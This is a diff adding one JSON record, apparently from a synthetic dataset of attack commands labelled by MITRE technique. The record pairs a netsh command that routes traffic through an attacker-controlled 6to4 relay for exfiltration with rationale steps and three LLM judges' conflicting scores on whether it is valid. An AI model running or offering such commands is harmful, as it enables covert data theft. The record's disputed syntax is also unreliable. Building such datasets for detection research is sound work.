@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "netsh interface 6to4 set state enabled relay=198.51.100.42",
+  "explanation": "Enables 6to4 with a specified relay to route IPv6 traffic over IPv4 to a controlled endpoint, creating an alternative medium for exfiltration (T1011).",
+  "rationale_steps": [
+    "Activate 6to4 to encapsulate IPv6 traffic in IPv4.",
+    "Force traffic through a specific relay under attacker control.",
+    "Use the resulting IPv6 path for data exfiltration away from standard channels."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-9788b456-bd44966f",
+  "source_prompt_hash": "9788b456",
+  "timestamp_utc": "2025-09-30T08:11:11.119466Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 2,
+        "syntactic_justification": "In netsh 6to4, 'set state' requires 'state=enabled' and relay configuration is done via a separate 'set relay address=<IPv4>' command, so using 'relay=' within 'set state' is not a valid parameter and will likely fail.",
+        "semantic_score": 2,
+        "semantic_justification": "Even if corrected and run with admin rights on a supported OS, this only toggles 6to4 and points to a relay (no data movement or automation), which is misaligned with Automated Exfiltration (T1011).",
+        "combined_score": 2.0,
+        "confidence": 0.6,
+        "timestamp": "2025-10-01T02:11:19.735930Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct syntax for the netsh interface 6to4 set state command, including proper parameter format and valid IP address specification.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly enables 6to4 tunneling with a specified relay that could create an alternative communication channel for data exfiltration, though it requires additional components to fully implement automated exfiltration as described in T1011.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T02:11:22.460235Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with valid syntax, proper command structure, and correctly formatted parameters for `netsh`.",
+        "semantic_score": 2,
+        "semantic_justification": "While the command's internal semantics are correct for configuring 6to4, it requires administrative privileges to execute, directly contradicting the stated 'Privilege: None', thus preventing it from achieving the claimed intent of creating an exfiltration medium in practice.",
+        "combined_score": 3.5,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T02:11:39.352499Z"
+      }
+    ],
+    "llm_average_syntactic": 4.0,
+    "llm_average_semantic": 2.667,
+    "llm_average_score": 3.333,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
